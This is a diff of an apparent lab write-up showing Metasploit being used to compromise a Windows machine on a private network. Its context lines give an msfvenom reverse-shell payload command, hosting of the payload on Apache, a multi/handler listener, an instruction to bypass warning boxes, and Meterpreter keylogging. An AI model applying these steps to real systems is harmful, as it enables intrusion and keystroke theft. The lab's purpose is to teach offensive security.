@@ -25,41 +25,41 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 
 ## OUTPUT:
-![alt text](SCREENSHOT/image.png)
+![alt text](image.png)
 ```
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ```
 ## OUTPUT:
-![alt text](SCREENSHOT/image-1.png)
+![alt text](image-1.png)
 ```
 copy the fun.exe into the apache /var/www/html folder
 ```
 ## OUTPUT:
-![alt text](SCREENSHOT/image-2.png)
+![alt text](image-2.png)
 
 ```
 Start apache server
 sudo systemctl apache2 start
 ```
 ## OUTPUT:
-![alt text](SCREENSHOT/image-3.png)
+![alt text](image-3.png)
 ```
 Check the status of apache2
 ```
 ## OUTPUT:
-![alt text](SCREENSHOT/image-4.png)
+![alt text](image-4.png)
 ```
 Invoke msfconsole:
 ```
 ## OUTPUT:
-![alt text](SCREENSHOT/image-5.png)
+![alt text](image-5.png)
 
 ```
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ```
 
-![alt text](SCREENSHOT/image-6.png)
+![alt text](image-6.png)
 ```
 Starting a command and control Server
 use multi/handler
@@ -68,32 +68,32 @@ set LHOST 0.0.0.0
 exploit
 ```
 
-![alt text](SCREENSHOT/image-7.png)
+![alt text](image-7.png)
 ```
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
 ```
 
-![alt text](SCREENSHOT/image-8.png)
+![alt text](image-8.png)
 ```
 Bypass any warning boxes, double-click the file, and allow it to run.
 ```
 
 
-![alt text](SCREENSHOT/image-9.png)
+![alt text](image-9.png)
 ```
 On kali give the command exploit
 ```
 
 
-![alt text](SCREENSHOT/image-10.png)
+![alt text](image-10.png)
 ```
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ```
 
-![alt text](SCREENSHOT/image-11.png)
+![alt text](image-11.png)
 
 ```
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
@@ -107,7 +107,7 @@ A list of network connections appears, including one to a remote port of 4444, a
 Notice the "PID/Program name" value for this connection, which is redacted 
 ```
 
-![alt text](SCREENSHOT/image-12.png)
+![alt text](image-12.png)
 
 ```
 Post Exploitation
@@ -115,14 +115,14 @@ The target is now owned. Following are meterpreter commands for key capturing in
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 ```
 
-![alt text](SCREENSHOT/image-13.png)
+![alt text](image-13.png)
 
-![alt text](SCREENSHOT/image-14.png)
+![alt text](image-14.png)
 ```
 keyscan_dump	Shows the keystrokes captured so far
 ```
 
-![alt text](SCREENSHOT/image-15.png)
+![alt text](image-15.png)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
